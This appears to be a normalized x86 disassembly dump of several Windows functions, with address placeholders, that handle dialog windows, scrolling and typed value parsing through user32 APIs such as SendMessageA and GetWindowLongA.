mov [ esp + 0x203cc ] 0x1a
xor ebx ebx
call sub_4010c0
test eax eax
jle r-xdata
cmp edi 0x15
jne r-xdata
lea ecx [ esp + 0x368 ]
mov [ esp + 0x2f ] 0x1
call sub_44fb10
push eax
lea ecx [ esp + 0x100 ]
call sub_402510
jmp r-xdata
mov ecx [ esp + 0x60 ]
call sub_4010c0
cmp ebx eax
je r-xdata
mov edx [ esp + 0x64 ]
mov edi [ esp + edx * 4 + 0x138 ]
cmp edi 0x19
jne r-xdata
lea ecx [ esp + 0x368 ]
call sub_450270
cmp eax 0x2
jne r-xdata
mov ecx [ esp + 0x10374 ]
mov [ esp + 0x9c ] ecx
lea ecx [ esp + 0x368 ]
call sub_450380
mov edi eax
test edi edi
je r-xdata
lea ecx [ esp + 0x1f0 ]
lea ecx [ esp + 0x368 ]
call sub_450380
cmp eax 0x3c
lea ecx [ esp + 0x1f0 ]
jne r-xdata
mov ecx [ esp + 0x60 ]
inc ebx
add edi 0x4
call sub_4010c0
cmp ebx eax
jl r-xdata
cmp edi 0x14
je r-xdata
inc [ esp + 0x3c ]
jmp r-xdata
lea ecx [ esp + 0x368 ]
call sub_450380
jmp r-xdata
call sub_4480e0
mov edx [ esp + 0x10374 ]
mov [ esp + 0x5c ] edx
mov [ esp + 0x203cc ] 0x19
call sub_4480e0
jmp r-xdata
mov eax [ edi ]
push eax
lea ecx [ esp + 0x1f4 ]
push ecx
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
mov al [ esp + 0x2f ]
test al al
mov [ esp + 0x203cc ] 0x1b
je r-xdata
cmp edi 0x1a
jne r-xdata
mov ecx [ esp + 0x5c ]
mov eax [ esp + 0x9c ]
sub eax ecx
push eax
push ecx
lea ecx [ esp + 0xe8 ]
call sub_401e80
push 0xffffffff
push 0x0
lea eax [ esp + 0x104 ]
push eax
lea ecx [ esp + 0xec ]
call sub_401dd0
jmp r-xdata
mov eax [ esp + 0x3c ]
dec eax
test eax eax
mov [ esp + 0x3c ] eax
jg r-xdata
mov eax [ esp + 0x10374 ]
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x5c ] eax
mov [ esp + 0x2f ] 0x0
inc ebx
mov [ esp + 0x203cc ] 0x19
call sub_4480e0
cmp edi 0x1a
jne r-xdata
mov ecx [ esp + 0x38 ]
mov eax [ ecx + 0x8 ]
mov ecx ebx
imul ecx ecx 0x1c
push 0xffffffff
push 0x0
lea edx [ esp + 0xe8 ]
add ecx eax
push edx
call sub_401dd0
mov eax [ esp + 0xf4 ]
test eax eax
jbe r-xdata
mov edi [ rw-data ]
lea ecx [ esi + edi + 0x6c ]
call sub_4010c0
mov edx [ esp + 0x30 ]
cmp edx eax
jge r-xdata
mov eax [ esp + 0x30 ]
inc eax
lea ecx [ esp + 0xfc ]
mov [ esp + 0x30 ] eax
call sub_4480e0
lea ecx [ esp + 0xb8 ]
mov ecx [ esi + edi + 0x70 ]
mov ebx [ esp + 0x38 ]
mov eax [ ebx + 0x8 ]
mov edi edx
imul edi edi 0x1c
push 0xffffffff
push 0x0
add ecx edi
push eax
call sub_401dd0
lea ecx [ esp + 0x10390 ]
call sub_438500
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov [ esp + 0x203cc ] 0x1c
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + ebx + 0x40 ]
cmp [ eax + ecx ] 0x69
jne r-xdata
lea ecx [ esp + 0x1cc ]
call sub_40b120
mov [ esp + 0xa8 ] 0x62
mov [ esp + 0xac ] al
mov esi [ esi + ebx + 0x50 ]
mov edx [ esp + 0x30 ]
lea eax [ esp + 0xa8 ]
lea ecx [ esi + edx * 8 ]
push eax
mov [ esp + 0x203d0 ] 0x1e
call sub_40b0b0
lea ecx [ esp + 0xa8 ]
jmp r-xdata
push eax
lea ecx [ esp + 0x10394 ]
call j_sub_44f660
mov [ esp + 0x1ec ] 0xf
mov [ esp + 0x1e8 ] 0x0
mov [ esp + 0x1d8 ] 0x0
mov [ esp + 0x1cc ] 0x76
lea ecx [ esp + 0x1cc ]
push ecx
lea ecx [ esp + 0x10394 ]
mov [ esp + 0x203d0 ] 0x1d
call sub_439260
mov ebx [ rw-data ]
mov eax [ esp + 0x30 ]
mov ecx [ esi + ebx + 0x40 ]
add eax eax
cmp [ eax + ecx ] 0x62
jne r-xdata
mov ecx [ esi + ebx + 0x40 ]
cmp [ ecx + eax ] 0x66
jne r-xdata
lea ecx [ esp + 0x1cc ]
call sub_40b1a0
mov [ esp + 0x94 ] 0x69
mov [ esp + 0x98 ] eax
mov esi [ esi + ebx + 0x50 ]
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x94 ]
lea ecx [ esi + ecx * 8 ]
push edx
mov [ esp + 0x203d0 ] 0x1f
call sub_40b0b0
lea ecx [ esp + 0x94 ]
jmp r-xdata
mov [ esp + 0x203cc ] 0x1d
call sub_40b090
mov ecx [ esi + ebx + 0x40 ]
cmp [ ecx + eax ] 0x73
jne r-xdata
lea ecx [ esp + 0x1cc ]
call sub_40b200
fstp [ esp + 0xb4 ]
mov [ esp + 0xb0 ] 0x66
mov esi [ esi + ebx + 0x50 ]
mov eax [ esp + 0x30 ]
lea edx [ esp + 0xb0 ]
lea ecx [ esi + eax * 8 ]
push edx
mov [ esp + 0x203d0 ] 0x20
call sub_40b0b0
lea ecx [ esp + 0xb0 ]
jmp r-xdata
lea ecx [ esp + 0x1cc ]
call sub_40ba70
lea ecx [ esp + 0x10390 ]
mov [ esp + 0x203cc ] 0x19
call sub_44f5f0
mov eax [ esp + 0x38 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + ebx + 0x60 ]
lea ecx [ ebx + edi ]
push eax
call sub_401ff0
mov ebx [ rw-data ]
mov eax [ esi + ebx + 0x60 ]
lea ecx [ eax + edi ]
call sub_4010a0
mov [ esp + 0xa0 ] 0x73
mov [ esp + 0xa4 ] eax
mov esi [ esi + ebx + 0x50 ]
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0xa0 ]
lea ecx [ esi + ecx * 8 ]
push edx
mov [ esp + 0x203d0 ] 0x21
call sub_40b0b0
lea ecx [ esp + 0xa0 ]
sub_410cb0
push 0xffffffff
push sub_4bf2f2
mov eax [ fs : 0x0 ]
push eax
mov eax 0x100dc
mov [ fs : 0x0 ] esp
call sub_4b6180
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x100f0 ]
push ebp
mov ebp [ esp + 0x100f8 ]
shl eax 0x4
mov eax [ eax + rw-data ]
lea ebp [ ebp + ebp * 4 ]
push esi
shl ebp 0x5
add ebp eax
mov eax [ ebx + 0x18 ]
push edi
mov esi 0x10
push ecx
cmp eax esi
mov [ esp + 0x40 ] ebp
mov edx esp
lea eax [ ebx + 0x4 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea ecx [ esp + 0x40 ]
push ecx
mov ecx ebx
call sub_401c60
mov al [ ebp + 0x4 ]
test al al
je r-xdata
mov eax [ eax ]
mov edi [ ebx + 0x14 ]
add edi ecx
mov [ edx ] edi
cmp [ ebx + 0x18 ] esi
push ecx
mov ecx esp
jb r-xdata
cmp [ ebp + 0x28 ] esi
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea edx [ ebp + 0x14 ]
mov edx [ ebp + 0x14 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx ebx
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
mov ecx ebx
call sub_401cc0
mov eax r--data
lea ecx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax edx
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
mov ecx ebx
call sub_401cc0
xor edx edx
xor esi esi
mov edi 0x1
mov [ esp + 0x10 ] edx
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] edx
jmp r-xdata
mov ecx [ ebp + 0x40 ]
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x44 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ ebp + 0x70 ]
mov ecx [ esp + 0x14 ]
push 0xffffffff
add eax ecx
push edx
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] edx
mov [ esp + 0x2c ] 0x0
call sub_401dd0
mov eax [ esp + 0x30 ]
test eax eax
mov [ esp + 0x100f4 ] 0x0
jne r-xdata
cmp [ esp + 0x10 ] eax
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx ebx
call sub_401cc0
mov ecx [ esp + 0x100ec ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x100e8
retn
mov bl [ esp + 0x10104 ]
test bl bl
je r-xdata
mov eax [ ebp + 0x90 ]
cmp [ esi + eax ] 0x5
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jbe r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x10100 ]
push edx
push eax
lea ecx [ esp + 0x24 ]
push ecx
call sub_40e460
add esp 0xc
mov eax [ esi + eax + 0x8 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x28 ]
call sub_401dd0
cmp [ esp + 0x34 ] 0x10
mov [ esp + 0x100f4 ] 0xffffffff
jb r-xdata
mov eax [ esp + 0x10 ]
cmp edi eax
jge r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x100fc ]
inc edx
add eax 0x14
add ecx 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
mov esi eax
xor edx edx
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x10 ]
mov eax [ ebp + 0x40 ]
lea esi [ ecx + ecx ]
cmp [ esi + eax ] 0x73
jne r-xdata
mov esi eax
sub esi edi
test bl bl
je r-xdata
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
test bl bl
mov [ esp + 0x100f4 ] 0x1
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x10108 ]
call sub_4018c0
mov edi [ esp + 0x10 ]
lea ecx [ esp + 0xc0 ]
call sub_438500
xor ebx ebx
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] ebx
mov [ esp + 0x68 ] bl
mov [ esp + 0x5c ] 0x76
mov eax [ esp + 0x34 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x20 ]
mov [ esp + 0x100f4 ] 0x5
jae r-xdata
cmp [ esp + 0x34 ] 0x10
mov edi [ esp + 0x20 ]
jae r-xdata
mov eax [ ebp + 0x50 ]
cmp [ eax + ecx * 8 ] 0x73
jne r-xdata
mov ecx [ esp + 0x100fc ]
sub eax edx
push eax
push r--data
call sub_401cc0
dec esi
jne r-xdata
push eax
lea ecx [ esp + 0xc4 ]
call j_sub_44f660
lea edx [ esp + 0x5c ]
push edx
lea ecx [ esp + 0xc4 ]
call sub_439260
mov eax [ ebp + 0x40 ]
movsx eax [ esi + eax ]
cmp eax 0x62
je r-xdata
lea eax [ esp + 0x20 ]
push edi
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x10 ]
mov ebp eax
mov eax [ esp + 0x3c ]
mov eax [ eax + 0x80 ]
mov bl [ eax + ecx ]
xor esi esi
test ebp ebp
jle r-xdata
lea edi [ esp + 0x20 ]
xor edi edi
jmp r-xdata
mov edx ecx
mov edi [ eax + edx * 8 + 0x4 ]
jmp r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
jmp r-xdata
lea ecx [ esp + 0x5c ]
call sub_40b120
mov [ esp + 0x5c ] 0x62
mov [ esp + 0x60 ] al
cmp eax 0x66
je r-xdata
test bl bl
je r-xdata
lea ecx [ ecx ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x24 ]
call sub_401e80
cmp [ esp + 0x7c ] edi
jb r-xdata
lea ecx [ esp + 0x5c ]
call sub_40b200
fstp [ esp + 0x60 ]
mov [ esp + 0x5c ] 0x66
jmp r-xdata
cmp eax 0x69
jne r-xdata
lea edx [ esp + 0x40 ]
push edx
lea eax [ esp + 0xa8 ]
push r--data
push eax
call sub_40c3c0
push r--data
push eax
lea ecx [ esp + 0x9c ]
push ecx
mov [ esp + 0x1010c ] 0x2
call sub_402140
add esp 0x18
push 0xffffffff
xor edi edi
push edi
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10100 ] 0x3
call sub_401dd0
mov eax [ esp + 0xa0 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov al [ esp + 0x10104 ]
test al al
jne r-xdata
cmp al 0xd
je r-xdata
mov [ esp + 0x84 ] al
mov eax [ esp + 0x84 ]
push eax
push 0x1
lea ecx [ esp + 0x48 ]
call sub_4017f0
mov cl [ esi + edi + 0x1 ]
inc esi
mov [ esp + 0x80 ] cl
mov edx [ esp + 0x80 ]
push edx
jmp r-xdata
lea ecx [ esp + 0xc0 ]
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] ebx
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x100f4 ] 0x0
call sub_44f5f0
mov eax [ esp + 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x5c ]
call sub_40c960
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
lea ecx [ esp + 0x5c ]
call sub_40b1a0
mov [ esp + 0x5c ] 0x69
mov [ esp + 0x60 ] eax
jmp r-xdata
cmp [ esp + 0xbc ] esi
mov ebx 0xf
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x9c ] edi
mov [ esp + 0x8c ] 0x0
jb r-xdata
mov edx [ esp + 0x8c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ esp + 0x48 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401dd0
jmp r-xdata
inc esi
cmp esi ebp
jl r-xdata
cmp al 0xa
jne r-xdata
lea ecx [ esp + 0x44 ]
push 0x1
call sub_4017f0
mov [ esp + 0xbc ] ebx
mov [ esp + 0xb8 ] edi
mov [ esp + 0xa8 ] 0x0
mov eax [ esp + 0xa8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x58 ] 0x10
mov [ esp + 0x100f4 ] 0x0
jb r-xdata
mov al [ esi + edi ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
cmp al 0x22
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov ebp [ esp + 0x3c ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x44 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp al 0x5c
jne r-xdata
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
mov [ esp + 0x38 ] al
mov eax [ esp + 0x38 ]
push eax
test bl bl
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
nop
mov cl [ esp + 0x10104 ]
test cl cl
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ esp + 0x10104 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
sub_411300
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4bf41e
push eax
mov eax 0x10400
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
lea ecx [ esp + 0x3e4 ]
call sub_438500
mov eax [ esp + 0x10424 ]
cmp eax 0x114
mov [ esp + 0x10418 ] 0x0
ja r-xdata
sub eax 0x4c8
je r-xdata
je r-xdata
mov ecx [ esp + 0x1042c ]
mov ebx [ esp + 0x10428 ]
mov ebp [ esp + 0x10420 ]
push ecx
push ebx
push 0x4c9
push ebp
call [ SendMessageA@IAT ]
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
push ebp
mov [ esp + 0x1c ] eax
call [ GetDC@IAT ]
mov edx eax
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
lea ebx [ ebx + ebx * 4 ]
shl ebx 0x5
cmp [ ebx + eax + 0x28 ] 0x10
mov ecx [ ebx + eax + 0x24 ]
mov [ esp + 0x1c ] edx
jb r-xdata
dec eax
je r-xdata
mov ebx [ esp + 0x10420 ]
push 0xffffffeb
push ebx
call [ GetWindowLongA@IAT ]
mov ebp [ GetDlgItem@IAT ]
lea edi [ eax + eax * 4 ]
mov [ esp + 0x1c ] eax
mov esi 0x1
shl edi 0x5
sub eax 0x6
je r-xdata
lea eax [ ebx + eax + 0x14 ]
mov eax [ ebx + eax + 0x14 ]
jmp r-xdata
mov esi [ esp + 0x10428 ]
lea ecx [ esi + 0x1 ]
push ecx
lea edx [ esp + 0x1e8 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
lea eax [ esi + esi * 4 ]
shl eax 0x5
add eax ecx
add eax 0x10
push eax
lea ecx [ esp + 0x1f4 ]
push ecx
lea edx [ esp + 0x90 ]
push edx
call sub_40c3c0
mov eax [ esp + 0xac ]
mov ebx 0x10
add esp 0x18
cmp eax ebx
mov eax [ esp + 0x80 ]
jae r-xdata
dec eax
jne r-xdata
mov eax [ eax + edi + 0x44 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov esi [ esp + 0x10420 ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0xe
push esi
call ebx
test eax eax
jle r-xdata
sub eax 0x10a
je r-xdata
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ ebx + eax + 0x40 ]
test edx edx
jne r-xdata
lea esi [ esp + 0xfc ]
push esi
push ecx
push eax
push edx
call [ GetTextExtentPoint32A@IAT ]
mov ecx [ esp + 0xfc ]
add ecx 0x28
xor eax eax
mov [ esp + 0x28 ] ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x10 ] 0x1
mov edi 0x1c
mov [ esp + 0x14 ] 0x14
jmp r-xdata
mov edi [ esp + 0x10420 ]
push eax
push edi
call [ SetWindowTextA@IAT ]
push esi
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
cmp [ esp + 0x94 ] ebx
jb r-xdata
lea eax [ esp + 0x80 ]
lea ecx [ esp + 0x3e4 ]
mov [ esp + 0x10418 ] 0xffffffff
call sub_44f5f0
xor eax eax
mov edx [ esp + 0x10420 ]
push 0xffffffeb
push edx
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov ebx eax
mov [ esp + 0x28 ] ebx
shl ecx 0x4
mov ecx [ ecx + rw-data ]
lea ebx [ ebx + ebx * 4 ]
shl ebx 0x5
mov edx [ ecx + ebx + 0x40 ]
test edx edx
mov eax 0x1
jne r-xdata
shl edx 0x4
mov edx [ edx + rw-data ]
mov ecx [ edx + edi + 0x40 ]
test ecx ecx
jne r-xdata
lea ecx [ esi + 0x190 ]
push ecx
push ebx
call ebp
cmp eax [ esp + 0x1042c ]
je r-xdata
cmp esi eax
jge r-xdata
cmp [ esp + 0x10428 ] 0x0
je r-xdata
lea ecx [ esp + 0x3e4 ]
mov [ esp + 0x10418 ] 0xffffffff
call sub_44f5f0
mov eax 0x1
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ ebx + eax + 0x44 ]
sub ecx edx
sar ecx 0x1
xor ecx ecx
jmp r-xdata
mov eax [ esp + 0x80 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov ecx [ ecx + ebx + 0x44 ]
sub ecx edx
sar ecx 0x1
xor ecx ecx
jmp r-xdata
mov eax [ edx + edi + 0x44 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
inc esi
jmp r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xffffffeb
push esi
call edi
push 0x0
push eax
push 0x186
push 0x3e9
push 0xfffffff8
push esi
call edi
push eax
call [ GetDlgItem@IAT ]
push eax
call ebx
push 0xfffffff8
push esi
call edi
push eax
push 0x103e9
push 0x111
push 0xfffffff8
push esi
call edi
push eax
call ebx
jmp r-xdata
mov ecx [ esp + 0x10410 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1040c
retn 0x10
mov ebx [ esp + 0x10428 ]
movzx edi bx
mov eax edi
dec eax
je r-xdata
mov [ esp + 0x20 ] 0x10
mov edi 0x1
mov ecx [ ebx + eax + 0x90 ]
mov edx [ esp + 0x14 ]
cmp [ edx + ecx ] 0x4
je r-xdata
cmp [ esp + 0x10 ] ecx
jge r-xdata
cmp eax ecx
jge r-xdata
mov eax edx
lea ecx [ edx + 0x1 ]
mov edx [ esp + 0x10428 ]
cmp edx 0xffffffff
je r-xdata
mov ebp [ esp + 0x1042c ]
lea edx [ esp + 0x60 ]
push edx
push 0x2
push ebp
mov [ esp + 0x6c ] 0x1c
mov [ esp + 0x70 ] 0x5
call [ GetScrollInfo@IAT ]
mov ebx [ esp + 0x10428 ]
cmp bx 0x8
mov [ esp + 0x64 ] 0x4
je r-xdata
cmp esi eax
je r-xdata
mov edx [ rw-data ]
mov eax edx
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ eax + edi + 0x40 ]
test ecx ecx
mov [ esp + 0x10 ] esi
jne r-xdata
push 0x0
call [ GetFocus@IAT ]
mov edx [ esp + 0x10424 ]
push eax
push edx
call [ GetNextDlgTabItem@IAT ]
mov esi eax
push esi
call [ SetFocus@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push esi
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebx + eax + 0x44 ]
sub ecx edx
sar ecx 0x1
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
inc edx
add ecx 0x14
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] ecx
add edi 0x1c
jmp r-xdata
mov eax [ ebx + eax + 0x30 ]
push 0xffffffff
add eax edi
push 0x0
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
call sub_401dd0
mov eax r--data
mov [ esp + 0x10418 ] 0x3
lea esi [ eax + 0x1 ]
jmp r-xdata
lea ebp [ eax + eax * 4 ]
shl ebp 0x2
lea esi [ eax * 8 ]
lea edi [ eax + eax ]
lea edx [ eax + 0x190 ]
sub ecx eax
mov [ esp + 0x10 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] edx
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] ecx
jmp r-xdata
movzx eax bx
cmp eax 0x7
ja r-xdata
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x10420 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
jmp r-xdata
sub eax 0x3f2
push 0xffffffeb
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push ebp
call [ ReleaseDC@IAT ]
mov edi [ esp + 0x28 ]
push 0x5
push 0x10
push 0x10
push 0x0
lea edx [ edi - 0x10 ]
push edx
push 0xffffffff
push 0x3f4
push ebp
call [ GetDlgItem@IAT ]
mov esi [ SetWindowPos@IAT ]
push eax
call esi
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov cl [ ebx + eax + 0x4 ]
test cl cl
je r-xdata
mov ecx [ ebx + eax + 0x90 ]
lea edx [ edi + edi * 4 ]
shl edx 0x2
mov ecx [ edx + ecx ]
cmp ecx 0x4
mov [ esp + 0x40 ] edx
mov [ esp + 0x14 ] ecx
je r-xdata
cmp edi ecx
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ eax + ebx + 0x90 ]
mov ecx [ ecx + ebp ]
cmp ecx 0x2
je r-xdata
cmp bx 0x5
je r-xdata
jmp [ eax * 4 + jump_table_4132fc ]
mov edi [ esp + 0x10424 ]
mov ebp [ GetWindowLongA@IAT ]
push edi
call ebp
mov edx [ rw-data ]
shl edx 0x4
mov ecx [ edx + rw-data ]
push 0x1
lea esi [ eax + eax * 4 ]
shl esi 0x5
mov dl [ esi + ecx + 0x4 ]
push eax
push 0x4cd
test dl dl
push 0xfffffff8
sete dl
push edi
mov [ esi + ecx + 0x4 ] dl
call ebp
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov cl [ esi + eax + 0x4 ]
test cl cl
je r-xdata
mov eax [ esp + 0x10424 ]
push eax
call [ GetWindowLongA@IAT ]
cmp bx 0x12c
mov ebp [ rw-data ]
mov esi eax
mov [ esp + 0x10 ] esi
jbe r-xdata
push 0x1
push 0x0
jmp r-xdata
inc edi
jmp r-xdata
mov eax [ ebx + eax + 0x30 ]
mov esi edi
imul esi esi 0x1c
push 0xffffffff
add eax esi
push 0x0
mov ebp 0xf
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x44 ] esi
mov [ esp + 0x68 ] ebp
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
call sub_401dd0
mov [ esp + 0x94 ] ebp
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ ebx + eax + 0x40 ]
movsx eax [ eax + edi * 2 ]
add eax 0xffffff9e
cmp eax 0x11
mov [ esp + 0x10418 ] 0x5
ja r-xdata
sub eax esi
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
cmp [ esp + 0x5c ] 0x10
mov eax [ esp + 0x48 ]
jae r-xdata
mov ecx [ eax + ebx + 0x40 ]
cmp [ ecx + edi ] 0x66
jne r-xdata
cmp ecx 0x3
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1
lea edx [ esp + 0x64 ]
push edx
push 0x2
push ebp
call [ SetScrollInfo@IAT ]
mov eax [ esp + 0x68 ]
mov [ esp + 0x74 ] eax
jmp r-xdata
mov ecx [ esp + 0x6c ]
jmp r-xdata
mov edx [ esp + 0x74 ]
cmp edx [ esp + 0x68 ]
jle r-xdata
mov eax [ esp + 0x74 ]
cmp eax [ esp + 0x6c ]
jge r-xdata
mov eax [ esp + 0x6c ]
mov esi [ esp + 0x68 ]
sub eax esi
cdq
and edx 0xf
add eax edx
sar eax 0x4
test eax eax
jg r-xdata
mov esi [ esp + 0x6c ]
mov edx [ esp + 0x68 ]
mov eax esi
sub eax edx
cdq
and edx 0xf
add eax edx
sar eax 0x4
test eax eax
jg r-xdata
mov ecx ebx
shr ecx 0x10
push r--data
push r--data
jmp r-xdata
cmp bx 0x1f4
jbe r-xdata
mov ecx ebp
shl ecx 0x4
mov eax [ ecx + rw-data ]
lea ebx [ esi + esi * 4 ]
shl ebx 0x5
lea ecx [ ebx + eax + 0x3c ]
call sub_40af20
add eax 0x12b
cmp edi eax
ja r-xdata
push 0x3f4
push ebp
call [ CheckDlgButton@IAT ]
mov ecx [ esp + 0x20 ]
mov ebx [ GetWindowLongA@IAT ]
xor eax eax
push 0xfffffff0
add ecx 0x4
add edi 0x4
push ebp
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] ecx
call ebx
push 0x188
push 0x0
push eax
lea edx [ esp + 0x6c ]
push edx
call [ AdjustWindowRectEx@IAT ]
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x64 ]
mov ecx [ esp + 0x68 ]
mov edi [ esp + 0x60 ]
push 0x6
sub eax edx
push eax
sub ecx edi
push ecx
push 0x0
push 0x0
push 0xffffffff
push ebp
call esi
mov edx [ esp + 0x10428 ]
push 0x0
push edx
push 0x4cd
push 0xfffffff8
push ebp
mov [ rw-data ] 0x0
call ebx
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ ebx + eax + 0x40 ]
test edx edx
mov [ esp + 0x10 ] edi
jne r-xdata
cmp [ esp + 0x5c ] 0x10
mov eax [ esp + 0x48 ]
mov [ rw-data ] 0x1
jae r-xdata
movzx ecx [ eax + lookup_table_413334 ]
jmp [ ecx * 4 + jump_table_41331c ]
mov edx [ esp + 0x58 ]
lea ecx [ esp + 0x38 ]
push ecx
push edx
push eax
